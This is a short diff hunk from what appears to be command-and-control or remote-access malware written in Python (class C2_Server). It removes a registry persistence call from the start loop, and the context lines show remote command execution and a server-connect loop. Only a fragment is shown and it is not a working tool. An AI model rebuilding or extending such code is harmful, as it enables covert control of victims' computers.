@@ -194,7 +194,6 @@ class C2_Server:
             return f"[*] Error executing command: {e}"
 
     def start(self):
-        self.add_to_registry()
         while True:
             client = self.connect_to_server()
             try:
